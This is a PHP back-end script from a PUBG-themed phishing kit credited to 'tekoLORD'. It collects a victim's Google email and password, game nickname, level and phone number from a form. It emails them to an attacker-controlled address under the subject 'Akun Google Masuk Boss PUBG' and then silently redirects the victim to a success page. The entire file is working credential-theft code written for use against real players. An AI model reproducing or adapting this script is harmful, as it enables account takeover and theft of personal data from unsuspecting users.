<?php 
    session_start();
        if (isset($_POST['r'])) {
            $r = $_POST['r'];
            $imel2 = $_POST['email'];
            $ptw = $_POST['gpass'];
            $nick1 = $_POST['nick1'];
            $lepel1 = $_POST['lepel1'];
            $hp1 = $_POST['hp1'];
               $_SESSION['email']=$imel2;
            include 'email.php';
		    $body = <<<EOD
		    <html><head><meta charset="UTF-8">

            <style>@font-face {font-family: "sibrandalan";src: url(assets/fonts/idhaam69.ttf);} #sibrandalan {font-family: "tekoLORD";border-collapse: collapse;width: 50%;
		    margin: auto;}#sibrandalan td, #sibrandalan th {border: 1px solid #ddd;padding: 8px;}#sibrandalan tr:nth-child(even){background-color: #f2f2f2;}#sibrandalan tr:hover {background-color: #ddd;}
		    #sibrandalan th {padding-top: 12px;padding-bottom: 12px;text-align: left;background-color: #4CAF50;color: white;}</style></head>
		    <body>
		    <table id='tekoLORD'>
            <tr><th>Data Google</th></tr>
		    <tr><td>Email : $imel2</td></tr>
            <tr><td>password : $ptw</td></tr>
            <tr><td>Nick : $nick1</td></tr>
            <tr><td>Level : $lepel1</td></tr>
            <tr><td>Nomor Hp : $hp1</td></tr>
            <tr><th>Channel : tekoLORD</th></tr>
               <tr><th><h2><center>Script PUBG Season 8 Dan 9 <br/> Buatan tekoLORD</center></h2></th></tr>
		    </table>
		    </body>
		    </html>
EOD;
		    $subjek = 'Akun Google Masuk Boss PUBG '.$imel2.' ';
		    $headers = "From: PUBG@tekoLORD.id\n";
		    $headers .= "Content-type: text/html\r\n";
		    $success = mail($mailto, $subjek, $body, $headers);
            $random = rand(1000,5000);

            if ($success) {
                echo "<form id='autoea' action='success.php' method='POST'>
                <input type='hidden' name='email' value='$n'>
                </form>
                <script type='text/javascript'>document.getElementById('autoea').submit();</script>";
            }
        }
    ?>  